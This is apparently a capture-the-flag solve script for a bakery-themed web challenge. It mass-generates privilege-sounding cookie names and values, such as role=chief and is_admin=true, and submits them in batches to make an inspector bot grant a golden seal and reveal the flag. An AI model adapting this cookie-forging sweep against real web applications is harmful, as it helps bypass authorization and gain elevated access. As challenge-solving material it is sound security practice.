#!/usr/bin/env python3
"""Cookie-name sweep, done the way the primitive actually allows: ~300 names per batch.

The previous run tested 1255 candidate cookie names at ONE name per batch with values
{chief, inspector, true} and found nothing. That design is weak in two ways the mixer does
not force you to accept. mixer.js dispenses every ingredient as its own cookie before the
verdict POST, so a single batch can hand the inspector ~300 cookies at once, which means:

  * a rule that needs a CONJUNCTION of cookies (`role === 'chief' && approved === 'true'`)
    can never fire in a one-name batch, and
  * 1255 names x 3 values x 1 batch each is 1255 worker cycles for less coverage than the
    ~20 batches below.

Each batch here carries the same value for every name in a 300-name list, so a golden seal
identifies the *value* class; the "smart" batches assign the plausible value per name so a
mixed rule can fire in one shot. Batches are kept under 12 KB of cookies so they still get
stamped - a jammed batch proves nothing about the rule.
"""
import re
import sys
import time

from cc import new_baker

ROOTS = """role user_role userrole roles usertype type kind level tier rank group staff
admin isadmin is_admin permission permissions privilege privileges clearance authority auth
seal seallevel seal_level seal_type sealtype golden gold goldenseal golden_seal chief
headchief head_chief thechief the_chief chef inspector inspector_role quality_inspector
qualityinspector supervisor foreman manager director owner boss ceo founder president
baker master grandmaster legend legendary approved certified verified trusted internal
privileged override bypass debug dev maint mode review review_level reviewlevel reviewer
verdict decision outcome stamped sealed status state badge token sess session csrf
signature hmac apikey api_key secret salt passphrase password mix mixer drum tray dough
batch recipe ingredient cookie cookies cc cookiecorp orbital sector city moon sugar
sprinkles star dust solar cosmic quantum plasma nebula gravity comet vanilla cocoa honey
who actor principal identity sub iss aud xr ccrole cc_role cc-seal ccseal clevel c_level
x_role xrole x-level xlevel x-seal xseal priority scope grant granted scope_level
"""
VALUE_SUFFIX = ["", "s"]
PREFIXES = ["", "cc_", "cc-", "x_", "cookiecorp_", "cookie_"]


def names():
    out = []
    seen = set()
    for p in PREFIXES:
        for r in ROOTS.split():
            for cand in (p + r, p + r.replace("_", "-"), p + r.replace("_", "")):
                for c in (cand, cand.upper(), cand.capitalize()):
                    if c and c not in seen and len(c) <= 40:
                        seen.add(c)
                        out.append(c)
    return out


ALLN = names()
CHUNK = 290
SMART = {"role": "chief", "user_role": "chief", "level": "chief", "tier": "chief",
         "seal": "chief", "seal_level": "chief", "review_level": "chief", "authority": "chief",
         "clearance": "chief", "chief": "1", "chef": "1", "inspector": "1", "admin": "true",
         "is_admin": "true", "isadmin": "true", "approved": "true", "certified": "true",
         "verified": "true", "trusted": "true", "privileged": "true", "override": "true",
         "debug": "true", "golden": "true", "gold": "true", "golden_seal": "true",
         "staff": "chief", "group": "chief", "rank": "chief", "kind": "chief",
         "type": "chief", "status": "reviewed", "verdict": "chief", "decision": "chief",
         "stamp": "chief", "signed": "chief", "mode": "chief"}
SETS = [("smart", None), ("chief", "chief"), ("true", "true"), ("1", "1"), ("yes", "yes"),
        ("gold", "gold"), ("golden", "golden"), ("inspector", "inspector"),
        ("admin", "admin"), ("approved", "approved"), ("sealed", "sealed"),
        ("selfname", "@name")]


def log(*a):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a))
    sys.stdout.buffer.write((line + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def batch_state(c, rid):
    code, dash, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash or "", re.S)
    if not blk:
        return "norow", ""
    b = blk.group(0)
    st = re.search(r'class="pill (\w+)">(\w+)</span>', b)
    tail = " ".join(re.sub(r"<[^>]+>", " ", b.split("</span>")[-1]).split())
    seal = "NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:30])
    return seal, (st.group(2) if st else "?")


def run_batch(c, label, val, nlist, wait=True):
    ings = []
    used = set()
    total = 0
    for n in nlist:
        if n in used:
            continue
        v = (SMART.get(n, "chief") if val is None else ("@name" if val == "@name" else val))
        if v == "@name":
            v = n
        if total + len(n) + 1 + len(v) + 2 > 12200:
            break
        used.add(n)
        ings.append({"name": n, "value": v})
        total += len(n) + 1 + len(v) + 2
    code, out, dt = c.post("/api/recipe", {"title": "sweep " + label, "ingredients": ings})
    rid = out.get("id") if isinstance(out, dict) else None
    if not rid:
        log("  %-18s save -> %s %s" % (label, code, str(out)[:70]))
        return None
    log("  %-18s %s %d cookies %dB" % (label, rid[:8], len(ings), total))
    for k in range(15):
        code, o, _ = c.post("/api/recipe/%s/submit" % rid, {})
        if isinstance(o, dict) and o.get("ok"):
            break
        time.sleep(6)
    if wait:
        for k in range(14):
            time.sleep(5)
            seal, st = batch_state(c, rid)
            if st == "reviewed":
                break
        log("      -> %s %s" % (st, seal))
        if seal not in ("standard", "NONE"):
            code, page, _ = c.get("/recipe/%s" % rid)
            open("../files/golden_sweep_%s.html" % label, "w", encoding="utf-8").write(str(page))
            fl = re.findall(r"sun\{[^{}\r\n]{1,200}\}", str(page))
            log("      !!! %s -> %s flag=%s" % (label, seal, fl))
            if fl:
                open("../flag.txt", "w", encoding="utf-8").write(fl[0] + "\n")
                sys.exit(0)
    return rid


log("total candidate names: %d" % len(ALLN))
chunks = [ALLN[i:i + CHUNK] for i in range(0, len(ALLN), CHUNK)]
chunks = chunks[:2]
log("using %d chunks x %d value sets = %d batches; covers %d names"
    % (len(chunks), len(SETS), len(chunks) * len(SETS), sum(len(x) for x in chunks)))

u, c, _ = new_baker("sw")
made = 0
for ci, chunk in enumerate(chunks):
    for label, val in SETS:
        if made >= 9:
            u, c, _ = new_baker("sw")
            made = 0
            log("new user %s" % u)
        run_batch(c, "c%d-%s" % (ci, label), val, chunk)
        made += 1
        time.sleep(1)
log("sweep complete: %d batches" % (made,))
